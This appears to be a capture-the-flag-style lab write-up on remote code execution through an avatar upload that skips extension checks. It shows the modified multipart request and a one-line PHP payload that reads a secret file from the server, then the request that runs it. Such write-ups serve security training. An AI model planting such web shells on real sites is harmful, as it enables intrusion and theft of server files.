🛑 File Upload → Remote Code Execution
🎯 Lab

Remote Code Execution via Web Shell Upload

🧠 Vulnerability

The avatar upload functionality does not validate file extensions or restrict executable files.
This allows uploading a malicious PHP file and achieving Remote Code Execution.

🔎 Vulnerable Parameter
POST /my-account/avatar

Parameter:

avatar
⚡ Exploitation Steps
1. Identify Upload Functionality

Navigate to the avatar upload feature.

2. Upload Any Image

Upload a normal image and intercept the request in Burp Suite.

Original request section:

Content-Disposition: form-data; name="avatar"; filename="image.jpg"
Content-Type: image/jpeg
3. Modify Filename to PHP

Change it to:

Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg
4. Inject PHP Payload

Replace the image body with:

<?php echo file_get_contents('/home/carlos/secret'); ?>
5. Send the Request

Server responds:

HTTP/1.1 200 OK

Upload successful.

6. Execute the Shell

Access the uploaded file:

GET /files/avatars/exploit.php

Response:

<contents of /home/carlos/secret>

Lab solved.
